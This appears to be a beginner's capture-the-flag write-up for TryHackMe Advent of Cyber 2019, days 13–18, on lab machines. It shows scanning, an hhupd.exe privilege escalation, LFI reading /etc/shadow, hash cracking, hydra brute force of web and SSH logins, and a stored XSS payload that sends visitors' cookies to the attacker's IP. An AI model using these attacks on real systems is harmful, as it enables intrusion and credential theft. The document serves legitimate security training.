# [Advent of Cyber 1 [2019]](https://tryhackme.com/room/25daysofchristmas)

> Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

## Day 13: Accumulate

scan the target, it seem block the ping, so we do the following

```
nmap -Pn -sV -T4 10.10.84.176
```

![image](https://user-images.githubusercontent.com/90561566/209768620-0ad3fe80-0677-4a38-ad9b-0bbff645c8cc.png)

go to the webpage, it's default IIS of windows

![image](https://user-images.githubusercontent.com/90561566/209768825-e5b1da43-124e-4b76-a947-afa46e058ab3.png)

because this is more difficult than other challenge, the hint suggests to use directory-list-2.3-medium

```
gobuster dir -u http://10.10.84.176/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/209769591-34fa63e9-c8c7-43cf-85d3-048f8dfa18b8.png)

go to /retro webpage

![image](https://user-images.githubusercontent.com/90561566/209769457-bc7ce811-2621-4c01-a295-0d0106824d97.png)

it seems like a blog post, i found an author of all blog is someone callled Wade

![image](https://user-images.githubusercontent.com/90561566/209769786-b37838de-bc30-47f7-a309-16321c8650d1.png)

now, we can see all of his catagories and 1 comment

![image](https://user-images.githubusercontent.com/90561566/209769922-95bd96e7-25d9-4617-ad57-0f60c128ac85.png)

let's see it, maybe it's a password `parzival`

![image](https://user-images.githubusercontent.com/90561566/209769989-76857c17-b50c-4353-940a-f12d7c365bab.png)

comeback to ms-wbt-server at port 3389, use `remmina` to connect to RDP 10.10.84.176

![image](https://user-images.githubusercontent.com/90561566/209770459-ed056b89-da93-4a48-8beb-013e200019b1.png)

we can see user.txt at Desktop

![image](https://user-images.githubusercontent.com/90561566/209770608-a9d8da92-43fc-4ac2-8c8a-f978cc329b25.png)

the other app maybe interesting is hhupd.exe, quick research about it

![image](https://user-images.githubusercontent.com/90561566/209771258-bd74471d-d10a-49db-a456-b136af22804c.png)

open it with administrator permission

![image](https://user-images.githubusercontent.com/90561566/209771504-1c8b09d2-f446-4553-8a66-57549463def3.png)

Click on "Show more details" > "Show information about the publisher’s certificate"

![image](https://user-images.githubusercontent.com/90561566/209771625-42d5401b-2dd9-435f-a5fd-4ef1c989bf3f.png)

click on "Issue by: " link, it will open with your browser and no internet

![image](https://user-images.githubusercontent.com/90561566/209771897-de2b76f1-aa1c-49c3-8e0a-5ba589e72546.png)

From here you can escalate your privilege using either the save file dialogue

Ctrl+S and enter C:\Windows\System32\cmd.exe at search folder

![image](https://user-images.githubusercontent.com/90561566/209772396-8c617e98-33b6-4d20-aaed-166d1164c772.png)

now we can use system32 as administrator

![image](https://user-images.githubusercontent.com/90561566/209772535-365a9d32-ea59-46bf-b443-4cce2c070cef.png)

```
cd C:\Users\Administrator\Desktop
type root.txt
```

![image](https://user-images.githubusercontent.com/90561566/209772734-5c2c1636-8aff-4a1c-ad6e-9f5616614525.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/209772894-fc2cb14a-7e77-4295-a81a-9853bd9ea083.png)

## Day 14: Unknown Storage

we only know starting point bucket name is `advent-bucket-one`

go to https://advent-bucket-one.s3.amazonaws.com/

![image](https://user-images.githubusercontent.com/90561566/209891417-e5d9fb22-f696-4370-9947-d136b5800ba0.png)

i found a file employee_names.txt, view it

https://advent-bucket-one.s3.amazonaws.com/employee_names.txt

Answer

![image](https://user-images.githubusercontent.com/90561566/209891478-e145748e-522f-4232-8eae-ddae5cd2ed78.png)

## Day 15: LFI

scan the target

```
nmap -A -T4 10.10.194.192
```

![image](https://user-images.githubusercontent.com/90561566/210077072-9d558ebd-79b0-4b2e-88f9-8bde328b8c9e.png)

it has a webpage with node.js and ssh openned

![image](https://user-images.githubusercontent.com/90561566/210077140-af2d6193-7713-4160-825c-1f6b9acf5b34.png)

we can see that charlie is going to go to Hawaii

![image](https://user-images.githubusercontent.com/90561566/210077262-050f2838-2756-4737-b268-f01c2e48358a.png)

view source, i notice that

![image](https://user-images.githubusercontent.com/90561566/210077385-b64c85de-6689-4ae0-806b-74f5e1f8658b.png)

think about LFI, open burpsuite and intercept the requests

after forward, it return a request like that

![image](https://user-images.githubusercontent.com/90561566/210078866-28ae57b2-1982-47a5-b167-0837199dd1bb.png)

this means that we have a potential vector for LFI. Notice the `%2f` inside the get request this decodes to be `/`

send to repeater to test

![image](https://user-images.githubusercontent.com/90561566/210079044-42342576-41e9-4f72-9092-48028e9e672e.png)

success, i got the `/etc/shadow`

![image](https://user-images.githubusercontent.com/90561566/210079321-ab052f35-d16d-4edf-926d-55163e7494fc.png)

copy charlie password hash and crack it

```
hashcat -a 0 -m 1800 pass.txt /usr/share/wordlists/rockyou.txt --show
```

![image](https://user-images.githubusercontent.com/90561566/210079914-72278fae-adc1-4aec-809d-c3f63939d1c2.png)

ssh into the server

```
ssh charlie@10.10.194.192
password1
```

![image](https://user-images.githubusercontent.com/90561566/210080045-53ed286e-b9a9-4463-8038-68770611196a.png)

Answer

## Day 16: File Confusion

the task give us a zip file and our work is writing script by python to answer the questions

```
# extract.py
import os,zipfile,sys

with zipfile.ZipFile(sys.argv[1],'r') as zip:
    zip.extractall('extracted')
    for file in os.listdir('extracted'):
        if file.endswith('.zip'):
            with zipfile.ZipFile('extracted/'+file,'r') as zip2:
                zip2.extractall('extracted')
                os.remove('extracted/'+file)
os.system('ls extracted | wc -l')
```

```
# exif.py
import os, exiftool

files = os.listdir('extracted')

with exiftool.ExifTool() as et:
    metadata = et.get_metadata_batch(files)

for d in metadata:
    if "XMP:Version" in d.keys():
        print("File Name: {}".format(d["SourceFile"],d["XMP:Version"]))
```

```
# password.py 
import os

os.system('grep -r "password" extracted')
```

Answer

![image](https://user-images.githubusercontent.com/90561566/210139565-3d8ddb49-8ba9-4f3e-b212-296d8155d214.png)

## Day 17: Hydra-ha-ha-haa

scan the target

```
nmap -A -T4 10.10.89.63
```

![image](https://user-images.githubusercontent.com/90561566/210311397-50ed66d9-b6b3-46cc-a01a-7322b699a27a.png)

there is a hydra challenge at /login

![image](https://user-images.githubusercontent.com/90561566/210311514-3820fffb-0717-4ab4-a73c-cf1d7b5a4414.png)

catch request from devtool

![image](https://user-images.githubusercontent.com/90561566/210311677-26420160-5203-49f1-8b8a-5e1ff5b33648.png)

bruteforce with hydra

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.89.63 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

![image](https://user-images.githubusercontent.com/90561566/210312100-aa796a1c-6388-4c51-b60d-11e10353f97a.png)

after login, you found your flag

![image](https://user-images.githubusercontent.com/90561566/210312147-d0a25810-0e99-4ed8-a460-f0c3d54bef5e.png)

bruteforce ssh

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.89.63 -V -f
```

![image](https://user-images.githubusercontent.com/90561566/210312268-019b7ec0-7740-4465-8f70-0e6b6c661678.png)

```
ssh molly@10.10.89.63
butterfly
```

![image](https://user-images.githubusercontent.com/90561566/210312356-0d2fe8b7-dcff-4654-91de-6a51fdbc3f99.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/210312442-50efefa1-1081-4439-8169-7d457bf75c5d.png)

## Day 18: ELF JS

view the webpage at port 3000

![image](https://user-images.githubusercontent.com/90561566/210314235-4234366a-4f13-4b17-92a3-e1fea17f4cbd.png)

register one and login, we found a forum and see can comment here

![image](https://user-images.githubusercontent.com/90561566/210314327-e0d8f182-fcf7-4dca-a85d-fa1ebfdac86e.png)

test XSS

```
<script>alert(1)</script>
```

![image](https://user-images.githubusercontent.com/90561566/210314495-b20bcbef-9309-4562-a0c4-c6400f5cf838.png)

Cool, we can exploit an XSS vulnerability in the comment box to inject malicious Javascript into the database!

```
<script>window.location='http://10.8.0.74/?cookie='+document.cookie</script>
```

by doing that, anyone login to the website (include admin) will connect to our machine ip with their cookie

now exit the forum and open netcat

```
nc -vlnp 80
```

after a while, admin logged in

Answer

![image](https://user-images.githubusercontent.com/90561566/210316719-d53946c2-5b77-4d2a-a5f3-918d6e435d31.png)

## Day 19: Commands
























